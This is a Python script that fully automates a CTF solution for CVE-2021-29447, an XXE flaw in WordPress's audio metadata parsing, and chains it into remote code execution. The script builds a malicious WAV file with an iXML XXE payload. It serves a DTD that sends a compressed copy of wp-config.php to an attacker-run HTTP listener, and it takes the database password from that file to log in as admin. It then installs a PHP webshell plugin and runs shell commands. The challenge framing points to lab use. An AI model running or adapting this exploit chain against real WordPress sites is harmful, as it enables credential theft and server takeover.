#!/usr/bin/env python3
"""
Full automated solution for the CVE-2021-29447 CTF challenge.

Requirements:
    pip install requests

Steps this script automates:
    Stage 1 — Start OOB HTTP server (serves evil.dtd, captures callback)
    Stage 2 — Build malicious WAV with iXML chunk containing XXE payload
    Stage 3 — Login as j.doe (author) and upload the WAV
    Stage 4 — Wait for OOB callback → decode zlib+base64 → extract DB_PASSWORD
    Stage 5 — Login as admin with the exfiltrated password
    Stage 6 — Upload + activate PHP webshell plugin
    Stage 7 — Execute shell command → read /flag.txt

Usage:
    python3 3_solve.py --target http://localhost:8080 --lhost 172.17.0.1 --lport 8888

    --lhost  Your IP reachable FROM the WordPress container.
             On Linux with Docker: docker network inspect <net> | grep Gateway
             Default bridge: 172.17.0.1 — but check the actual network!
             Example: docker network inspect silent_channel_web_external | grep Gateway
"""
import argparse
import base64
import http.server
import io
import re
import struct
import sys
import threading
import time
import urllib.parse
import zlib
import zipfile

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    sys.exit('[-] Install requests: pip install requests')

# ─────────────────────────── WAV builder ────────────────────────────────
# BUG FIX: must use iXML chunk (not 'data') so getID3 parses XML via
# simplexml_load_string(ixml_content, LIBXML_NOENT) in getid3.lib.php:730

def build_wav(dtd_url: str) -> bytes:
    xml = (
        f'<?xml version="1.0"?>'
        f'<!DOCTYPE foo ['
        f'<!ENTITY % xxe SYSTEM "{dtd_url}">'
        f' %xxe;]>\n'
    ).encode()
    fmt = (b'fmt ' + struct.pack('<I', 16) + struct.pack('<H', 1)
           + struct.pack('<H', 1) + struct.pack('<I', 44100)
           + struct.pack('<I', 88200) + struct.pack('<H', 2) + struct.pack('<H', 16))
    ixml  = b'iXML' + struct.pack('<I', len(xml)) + xml   # iXML triggers XXE
    body  = b'WAVE' + fmt + ixml
    return b'RIFF' + struct.pack('<I', len(body)) + body

# ─────────────────────────── OOB HTTP server ────────────────────────────

class OOBHandler(http.server.BaseHTTPRequestHandler):
    captured = None   # raw query string from callback

    def do_GET(self):
        parsed   = urllib.parse.urlparse(self.path)
        raw_qs   = parsed.query   # do NOT use parse_qs — it turns '+' → ' '

        if parsed.path == '/evil.dtd':
            self.send_response(200)
            self.send_header('Content-Type', 'text/xml')
            self.end_headers()
            self.wfile.write(self.server.dtd_content.encode())
            return

        # Callback: /?p=<zlib-deflated+base64-encoded file content>
        m = re.search(r'(?:^|&)p=([^&]+)', raw_qs)
        if m:
            # urllib.parse.unquote decodes %XX but leaves '+' as '+' (correct)
            OOBHandler.captured = urllib.parse.unquote(m.group(1))
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            print('\n[+] OOB callback received!')
            return

        self.send_response(404)
        self.end_headers()

    def log_message(self, fmt, *args):
        pass

def start_oob_server(lhost: str, lport: int, dtd_content: str):
    srv = http.server.HTTPServer((lhost, lport), OOBHandler)
    srv.dtd_content = dtd_content
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv

# ─────────────────────────── WordPress client ───────────────────────────

class WPClient:
    def __init__(self, base_url: str):
        self.base = base_url.rstrip('/')
        self.s    = requests.Session()
        self.s.headers['User-Agent'] = 'Mozilla/5.0 CTF-Solver'

    def login(self, user: str, pw: str) -> bool:
        r = self.s.post(f'{self.base}/wp-login.php', data={
            'log': user, 'pwd': pw,
            'wp-submit': 'Log In',
            'redirect_to': '/wp-admin/',
            'testcookie': '1',
        }, allow_redirects=True)
        return 'wp-admin' in r.url or '/wp-admin/' in r.text

    def get_upload_nonce(self) -> str:
        r = self.s.get(f'{self.base}/wp-admin/media-new.php')
        m = re.search(r'"_wpnonce"\s*:\s*"([a-f0-9]+)"', r.text)
        if m:
            return m.group(1)
        m = re.search(r'name="_wpnonce" value="([a-f0-9]+)"', r.text)
        return m.group(1) if m else ''

    def upload_file(self, filename: str, data: bytes, mime='audio/wav') -> dict:
        nonce = self.get_upload_nonce()
        # BUG FIX: do NOT send post_id — when post_id=0 is present,
        # wp_ajax_upload_attachment() calls current_user_can('edit_post', 0)
        # which fails for j.doe and aborts the upload before getID3 runs.
        r = self.s.post(
            f'{self.base}/wp-admin/async-upload.php',
            files={'async-upload': (filename, io.BytesIO(data), mime)},
            data={'action': 'upload-attachment', '_wpnonce': nonce},
        )
        ct = r.headers.get('content-type', '')
        return r.json() if ct.startswith('application/json') else {}

    def upload_plugin(self, zip_data: bytes) -> bool:
        install_url = f'{self.base}/wp-admin/plugin-install.php?tab=upload'
        r = self.s.get(install_url)
        m = re.search(r'name="_wpnonce" value="([a-f0-9]+)"', r.text)
        if not m:
            return False
        nonce = m.group(1)
        r2 = self.s.post(
            f'{self.base}/wp-admin/update.php?action=upload-plugin',
            files={'pluginzip': ('shell.zip', io.BytesIO(zip_data), 'application/zip')},
            data={
                '_wpnonce': nonce,
                '_wp_http_referer': '/wp-admin/plugin-install.php?tab=upload',
                'install-plugin-submit': 'Install Now',
            },
            headers={'Referer': install_url},
            allow_redirects=True,
        )
        return ('activate' in r2.text or 'Plugin installed' in r2.text
                or 'already installed' in r2.text or 'ctf-shell' in r2.text)

    def activate_plugin(self, slug='ctf-shell/ctf-shell.php') -> bool:
        r = self.s.get(f'{self.base}/wp-admin/plugins.php')
        # WordPress uses _wpnonce= in activate links (not nonce=)
        m = re.search(
            rf'action=activate[^"]*{re.escape(slug.split("/")[0])}[^"]*_wpnonce=([a-f0-9]+)',
            r.text)
        if not m:
            return False
        nonce = m.group(1)
        self.s.get(
            f'{self.base}/wp-admin/plugins.php',
            params={'action': 'activate', 'plugin': slug, '_wpnonce': nonce},
            allow_redirects=True,
        )
        return True

    def rce(self, cmd: str) -> str:
        r = self.s.get(
            f'{self.base}/wp-content/plugins/ctf-shell/ctf-shell.php',
            params={'cmd': cmd},
        )
        return r.text.strip()

# ─────────────────────────── Webshell plugin ────────────────────────────

SHELL_PHP = '''\
<?php
/* Plugin Name: CTF Shell */
if (isset($_GET['cmd'])) {
    echo shell_exec($_GET['cmd']);
}
'''

def build_plugin_zip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('ctf-shell/ctf-shell.php', SHELL_PHP)
    return buf.getvalue()

# ─────────────────────────── Main ───────────────────────────────────────

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--target', default='http://localhost:8080',
                    help='WordPress URL (default: http://localhost:8080)')
    ap.add_argument('--lhost',  default='172.17.0.1',
                    help='Your IP reachable from the Docker container')
    ap.add_argument('--lport',  type=int, default=8888,
                    help='Local HTTP server port for OOB DTD + callback')
    args = ap.parse_args()

    DTD_URL = f'http://{args.lhost}:{args.lport}/evil.dtd'

    # zlib.deflate filter keeps the base64 URL under libxml2's ~4 KB request-line limit.
    # Raw wp-config.php base64 ≈ 4400 chars (too long); deflated ≈ 2200 chars (OK).
    dtd = (
        '<!ENTITY % file SYSTEM '
        '"php://filter/zlib.deflate/convert.base64-encode'
        '/resource=/var/www/html/wp-config.php">\n'
        '<!ENTITY % init '
        f'"<!ENTITY &#x25; send SYSTEM \'http://{args.lhost}:{args.lport}/?p=%file;\'>">\n'
        '%init;\n%send;\n'
    )

    print('=' * 60)
    print('  CVE-2021-29447 — WordPress XXE → RCE Chain')
    print('=' * 60)

    # ── Stage 1: OOB server ──────────────────────────────────────────────
    print(f'\n[Stage 1] Starting OOB HTTP server on 0.0.0.0:{args.lport}')
    start_oob_server('0.0.0.0', args.lport, dtd)
    print(f'          DTD endpoint: {DTD_URL}')

    # ── Stage 2-3: Build WAV + login + upload ─────────────────────────────
    print('\n[Stage 2] Building malicious WAV (iXML chunk XXE payload)...')
    wav = build_wav(DTD_URL)
    print(f'          WAV size: {len(wav)} bytes')

    print('\n[Stage 3] Logging in as j.doe (author role)...')
    wp = WPClient(args.target)
    if not wp.login('j.doe', 'employee2024!'):
        sys.exit('[-] Login failed — is WordPress running? docker compose up -d')

    print('          Uploading malicious WAV...')
    result = wp.upload_file('audio_metadata.wav', wav)
    if result.get('success'):
        print(f'          Upload succeeded — file ID {result["data"].get("id")}')
    else:
        print(f'          [!] Upload response: {result} — XXE may still fire')

    # ── Stage 4: Wait for OOB callback ───────────────────────────────────
    print('\n[Stage 4] Waiting for OOB XXE callback (up to 30s)...')
    for i in range(30):
        if OOBHandler.captured:
            break
        time.sleep(1)
        print(f'          {i+1}s...', end='\r')

    if not OOBHandler.captured:
        sys.exit(
            '\n[-] No callback received.\n'
            '    Check --lhost is the Docker gateway for the WordPress network.\n'
            '    Run: docker network inspect <net_name> | grep Gateway'
        )

    # Decode: base64 → raw deflate → plaintext
    try:
        compressed = base64.b64decode(OOBHandler.captured + '==')
        raw        = zlib.decompress(compressed, -15).decode(errors='replace')
    except Exception as e:
        sys.exit(f'\n[-] Failed to decode exfiltrated data: {e}')

    print(f'\n[+] Exfiltrated wp-config.php ({len(raw)} chars)')

    m = re.search(r"define\s*\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'", raw)
    if not m:
        sys.exit('[-] DB_PASSWORD not found in exfiltrated config')

    admin_pw = m.group(1)
    print(f'[+] DB_PASSWORD (reused as admin password): {admin_pw}')

    # ── Stage 5: Login as admin ──────────────────────────────────────────
    print('\n[Stage 5] Logging in as admin...')
    if not wp.login('admin', admin_pw):
        sys.exit('[-] Admin login failed — DB_PASSWORD may differ from admin password')
    print('          Admin session established')

    # ── Stage 6: Upload + activate webshell plugin ───────────────────────
    print('\n[Stage 6] Uploading PHP webshell plugin...')
    plugin_zip = build_plugin_zip()
    ok = wp.upload_plugin(plugin_zip)
    if not ok:
        print('          [!] Plugin install response unclear — attempting activation anyway')

    wp.activate_plugin('ctf-shell/ctf-shell.php')
    print('          Plugin activated')

    # ── Stage 7: RCE → flag ──────────────────────────────────────────────
    print('\n[Stage 7] Executing: cat /flag.txt')
    flag = wp.rce('cat /flag.txt')

    print()
    print('=' * 60)
    print(f'  FLAG: {flag}')
    print('=' * 60)


if __name__ == '__main__':
    main()
